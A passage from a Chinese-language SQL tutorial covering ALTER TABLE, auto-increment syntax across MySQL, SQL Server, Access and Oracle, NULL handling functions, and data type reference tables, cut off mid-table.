<p>要改变表中列的数据类型，请使用下面的语法：</p>
<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p><strong>My SQL / Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>Oracle 10G 之后版本:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<hr>
<p>SQL ALTER TABLE 实例</p>
<p>请看 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>现在，我们想在 “Persons” 表中添加一个名为 “DateOfBirth” 的列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> DateOfBirth <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<p>请注意，新列 “DateOfBirth” 的类型是 date，可以存放日期。数据类型规定列中可以存放的数据的类型。如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
<th align="left">DateOfBirth</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
<td align="left"></td>
</tr>
</tbody></table>
<hr>
<p>改变数据类型实例</p>
<p>现在，我们想要改变 “Persons” 表中 “DateOfBirth” 列的数据类型。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> DateOfBirth <span class="keyword">year</span></span><br></pre></td></tr></table></figure>

<p>请注意，现在 “DateOfBirth” 列的类型是 year，可以存放 2 位或 4 位格式的年份。</p>
<hr>
<p>DROP COLUMN 实例</p>
<p>接下来，我们想要删除 “Person” 表中的 “DateOfBirth” 列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> DateOfBirth</span><br></pre></td></tr></table></figure>

<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<h4 id="AUTO-INCREMENT-字段"><a href="#AUTO-INCREMENT-字段" class="headerlink" title="AUTO INCREMENT 字段"></a>AUTO INCREMENT 字段</h4><p>我们通常希望在每次插入新记录时，自动地创建主键字段的值。</p>
<p>我们可以在表中创建一个 auto-increment 字段。</p>
<hr>
<p>用于 MySQL 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (ID)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MySQL 使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER <span class="keyword">TABLE</span> Persons <span class="comment">AUTO_INCREMENT=100</span></span><br></pre></td></tr></table></figure>

<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 SQL Server 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int IDENTITY(1,1) PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS SQL Server 使用 <strong>IDENTITY</strong> 关键字来执行 auto-increment 任务。</p>
<p>在上面的实例中，<strong>IDENTITY 的开始值是 1，每条新记录递增 1。</strong></p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 identity 改为 IDENTITY(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Access 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID Integer PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS Access 使用 AUTOINCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTOINCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 autoincrement 改为 AUTOINCREMENT(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Oracle 的语法</p>
<p>在 Oracle 中，代码稍微复杂一点。</p>
<p>您必须通过 sequence 对象（该对象生成数字序列）创建 auto-increment 字段。</p>
<p>请使用下面的 CREATE SEQUENCE 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">SEQUENCE</span> seq_person</span><br><span class="line"><span class="keyword">MINVALUE</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">WITH</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">INCREMENT</span> <span class="keyword">BY</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">CACHE</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>上面的代码创建一个名为 seq_person 的 sequence 对象，它以 1 起始且以 1 递增。该对象缓存 10 个值以提高性能。cache 选项规定了为了提高访问速度要存储多少个序列值。</p>
<p>要在 “Persons” 表中插入新记录，我们必须使用 nextval 函数（该函数从 seq_person 序列中取回下一个值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">ID</span>,FirstName,LastName)</span><br><span class="line">VALUES (<span class="name">seq_person</span>.nextval,'Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋值为来自 seq_person 序列的下一个数字。”FirstName”列 会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<p>给已经存在的colume添加自增语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> column_name column_name data_type(<span class="keyword">size</span>) constraint_name AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">CHANGE</span> <span class="keyword">id</span> <span class="keyword">id</span> <span class="built_in">INT</span>( <span class="number">11</span> ) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NULL-值"><a href="#SQL-NULL-值" class="headerlink" title="SQL NULL 值"></a>SQL NULL 值</h4><hr>
<p>NULL 值代表遗漏的未知数据。</p>
<p>默认地，表的列可以存放 NULL 值。</p>
<p>本章讲解 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL NULL 值</p>
<p>如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以 NULL 值保存。</p>
<p>NULL 值的处理方式与其他值不同。</p>
<p>NULL 用作未知的或不适用的值的占位符。</p>
<p><strong>注释：</strong>无法比较 NULL 和 0；它们是不等价的。</p>
<hr>
<p>SQL 的 NULL 值处理</p>
<p>请看下面的 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>假如 “Persons” 表中的 “Address” 列是可选的。这意味着如果在 “Address” 列插入一条不带值的记录，”Address” 列会使用 NULL 值保存。</p>
<p>那么我们如何测试 NULL 值呢？</p>
<p>无法使用比较运算符来测试 NULL 值，比如 =、&lt; 或 &lt;&gt;。</p>
<p>我们必须使用 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL IS NULL</p>
<p>我们如何仅仅选取在 “Address” 列中带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NULL 操作符：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT LastName,FirstName,Address <span class="keyword">FROM</span> Persons</span><br><span class="line">WHERE<span class="built_in"> Address </span>IS <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>请始终使用 IS NULL 来查找 NULL 值。</p>
<hr>
<p>SQL IS NOT NULL</p>
<p>我们如何仅仅选取在 “Address” 列中不带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NOT NULL 操作符：</p>
<p>SELECT LastName,FirstName,Address FROM Persons<br>WHERE Address IS NOT NULL</p>
<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
</tr>
</tbody></table>
<p>在下一节中，我们了解 ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数。</p>
<h4 id="SQL-NULL-函数"><a href="#SQL-NULL-函数" class="headerlink" title="SQL NULL 函数"></a>SQL NULL 函数</h4><hr>
<p>SQL ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数</p>
<p>请看下面的 “Products” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">ProductName</th>
<th align="left">UnitPrice</th>
<th align="left">UnitsInStock</th>
<th align="left">UnitsOnOrder</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Jarlsberg</td>
<td align="left">10.45</td>
<td align="left">16</td>
<td align="left">15</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Mascarpone</td>
<td align="left">32.56</td>
<td align="left">23</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Gorgonzola</td>
<td align="left">15.67</td>
<td align="left">9</td>
<td align="left">20</td>
</tr>
</tbody></table>
<p>假如 “UnitsOnOrder” 是可选的，而且可以包含 NULL 值。</p>
<p>我们使用下面的 SELECT 语句：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+UnitsOnOrder)</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>在上面的实例中，如果有 “UnitsOnOrder” 值是 NULL，那么结果是 NULL。</p>
<p>微软的 ISNULL() 函数用于规定如何处理 NULL 值。</p>
<p>NVL()、IFNULL() 和 COALESCE() 函数也可以达到相同的结果。</p>
<p>在这里，我们希望 NULL 值为 0。</p>
<p>下面，如果 “UnitsOnOrder” 是 NULL，则不会影响计算，因为如果值是 NULL 则 ISNULL() 返回 0：</p>
<p><strong>SQL Server / MS Access</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">ISNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>Oracle</strong></p>
<p>Oracle 没有 ISNULL() 函数。不过，我们可以使用 NVL() 函数达到相同的结果：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>MySQL</strong></p>
<p>MySQL 也拥有类似 ISNULL() 的函数。不过它的工作方式与微软的 ISNULL() 函数有点不同。</p>
<p>在 MySQL 中，我们可以使用 IFNULL() 函数，如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">IFNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用 COALESCE() 函数，如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="keyword">COALESCE</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--如果alexa列为null值，则赋予0，否则，取原值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">ifnull</span>(alexa,<span class="number">0</span>)<span class="keyword">from</span> websites;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">COALESCE</span>(alexa,<span class="number">0</span>) <span class="keyword">from</span> websites;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-通用数据类型"><a href="#SQL-通用数据类型" class="headerlink" title="SQL 通用数据类型"></a>SQL 通用数据类型</h3><hr>
<p>数据类型定义列中存放的值的种类。</p>
<hr>
<p>SQL 通用数据类型</p>
<p>数据库表中的每个列都要求有名称和数据类型。Each column in a database table is required to have a name and a data type.</p>
<p>SQL 开发人员必须在创建 SQL 表时决定表中的每个列将要存储的数据的类型。数据类型是一个标签，是便于 SQL 了解每个列期望存储什么类型的数据的指南，它也标识了 SQL 如何与存储的数据进行交互。</p>
<p>下面的表格列出了 SQL 中通用的数据类型：</p>
<table>
<thead>
<tr>
<th>CHARACTER(n)</th>
<th>字符/字符串。固定长度 n。</th>
</tr>
</thead>
<tbody><tr>
<td>VARCHAR(n) 或 CHARACTER VARYING(n)</td>
<td>字符/字符串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>BINARY(n)</td>
<td>二进制串。固定长度 n。</td>
</tr>
<tr>
<td>BOOLEAN</td>
<td>存储 TRUE 或 FALSE 值</td>
</tr>
<tr>
<td>VARBINARY(n) 或 BINARY VARYING(n)</td>
<td>二进制串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>INTEGER(p)</td>
<td>整数值（没有小数点）。精度 p。</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>整数值（没有小数点）。精度 5。</td>
</tr>
<tr>
<td>INTEGER</td>
<td>整数值（没有小数点）。精度 10。</td>
</tr>
<tr>
<td>BIGINT</td>
<td>整数值（没有小数点）。精度 19。</td>
</tr>
<tr>
<td>DECIMAL(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。例如：decimal(5,2) 是一个小数点前有 3 位数，小数点后有 2 位数的数字。</td>
</tr>
<tr>
<td>NUMERIC(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。（与 DECIMAL 相同）</td>
</tr>
<tr>
<td>FLOAT(p)</td>
<td>近似数值，尾数精度 p。一个采用以 10 为基数的指数计数法的浮点数。该类型的 size 参数由一个指定最小精度的单一数字组成。</td>
</tr>
<tr>
<td>REAL</td>
<td>近似数值，尾数精度 7。</td>
</tr>
<tr>
<td>FLOAT</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DOUBLE PRECISION</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DATE</td>
<td>存储年、月、日的值。</td>
</tr>
<tr>
<td>TIME</td>
<td>存储小时、分、秒的值。</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>存储年、月、日、小时、分、秒的值。</td>
</tr>
<tr>
<td>INTERVAL</td>
<td>由一些整数字段组成，代表一段时间，取决于区间的类型。</td>
</tr>
<tr>
<td>ARRAY</td>
<td>元素的固定长度的有序集合</td>
</tr>
<tr>
<td>MULTISET</td>
<td>元素的可变长度的无序集合</td>
</tr>
<tr>
<td>XML</td>
<td>存储 XML 数据</td>
</tr>
</tbody></table>
<h3 id="SQL-数据类型快速参考手册"><a href="#SQL-数据类型快速参考手册" class="headerlink" title="SQL 数据类型快速参考手册"></a>SQL 数据类型快速参考手册</h3><p>然而，不同的数据库对数据类型定义提供不同的选择。</p>
<p>下面的表格显示了各种不同的数据库平台上一些数据类型的通用名称：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">Access</th>
<th align="left">SQLServer</th>
<th align="left">Oracle</th>
<th align="left">MySQL</th>
<th align="left">PostgreSQL</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>boolean</em></td>
<td align="left">Yes/No</td>
<td align="left">Bit</td>
<td align="left">Byte</td>
<td align="left">N/A</td>
<td align="left">Boolean</td>
</tr>
<tr>
<td align="left"><em>integer</em></td>
<td align="left">Number (integer)</td>
<td align="left">Int</td>
<td align="left">Number</td>
<td align="left">Int Integer</td>
<td align="left">Int Integer</td>
</tr>
<tr>
<td align="left"><em>float</em></td>
<td align="left">Number (single)</td>
<td align="left">Float Real</td>
<td align="left">Number</td>
<td align="left">Float</td>
<td align="left">Numeric</td>
</tr>
<tr>
<td align="left"><em>currency</em></td>
<td align="left">Currency</td>
<td align="left">Money</td>
<td align="left">N/A</td>
<td align="left">N/A</td>
<td align="left">Money</td>
</tr>
<tr>
<td align="left"><em>string (fixed)</em></td>
<td align="left">N/A</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
</tr>
<tr>
<td align="left"><em>string (variable)</em></td>
<td align="left">Text (&lt;256) Memo (65k+)</td>
<td align="left">Varchar</td>
<td align="left">Varchar Varchar2</td>
<td align="left">Varchar</td>
<td align="left">Varchar</td>
</tr>
<tr>
<td align="left"><em>binary object</em></td>
<td align="left">OLE Object Memo</td>
<td align="left">Binary (fixed up to 8K) Varbinary (&lt;8K) Image (&lt;2GB)</td>
<td align="left">Long Raw</td>
<td align="left">Blob Text</td>
<td align="left">Binary Varbinary</td>
</tr>
</tbody></table>
<p>在不同的数据库中，同一种数据类型可能有不同的名称。即使名称相同，尺寸和其他细节也可能不同！ <strong>请总是检查文档！</strong></p>
<h3 id="SQL-用于各种数据库的数据类型"><a href="#SQL-用于各种数据库的数据类型" class="headerlink" title="SQL 用于各种数据库的数据类型"></a>SQL 用于各种数据库的数据类型</h3><hr>
<p>Microsoft Access、MySQL 和 SQL Server 所使用的数据类型和范围。</p>
<hr>
<h4 id="Microsoft-Access-数据类型"><a href="#Microsoft-Access-数据类型" class="headerlink" title="Microsoft Access 数据类型"></a>Microsoft Access 数据类型</h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Text</td>
<td align="left">用于文本或文本与数字的组合。最多 255 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Memo</td>
<td align="left">Memo 用于更大数量的文本。最多存储 65,536 个字符。<strong>注释：</strong>无法对 memo 字段进行排序。不过它们是可搜索的。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Byte</td>
<td align="left">允许 0 到 255 的数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">Integer</td>
<td align="left">允许介于 -32,768 与 32,767 之间的全部数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">Long</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 之间的全部数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Single</td>
<td align="left">单精度浮点。处理大多数小数。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Double</td>
<td align="left">双精度浮点。处理大多数小数。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Currency</td>
<td align="left">用于货币。支持 15 位的元，外加 4 位小数。<strong>提示：</strong>您可以选择使用哪个国家的货币。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">AutoNumber</td>
<td align="left">AutoNumber 字段自动为每条记录分配数字，通常从 1 开始。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Date/Time</td>
<td align="left">用于日期和时间</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Yes/No</td>
<td align="left">逻辑字段，可以显示为 Yes/No、True/False 或 On/Off。在代码中，使用常量 True 和 False （等价于 1 和 0）。<strong>注释：</strong>Yes/No 字段中不允许 Null 值</td>
<td align="left">1 比特</td>
</tr>
<tr>
<td align="left">Ole Object</td>
<td align="left">可以存储图片、音频、视频或其他 BLOBs（Binary Large OBjects）。</td>
<td align="left">最多 1GB</td>
</tr>
<tr>
<td align="left">Hyperlink</td>
<td align="left">包含指向其他文件的链接，包括网页。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lookup Wizard</td>
<td align="left">允许您创建一个可从下拉列表中进行选择的选项列表。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<hr>
<h4 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h4><p>在 MySQL 中，有三种主要的类型：Text（文本）、Number（数字）和 Date/Time（日期/时间）类型。</p>
<p><strong>Text 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR(size)</td>
<td align="left">保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td align="left">VARCHAR(size)</td>
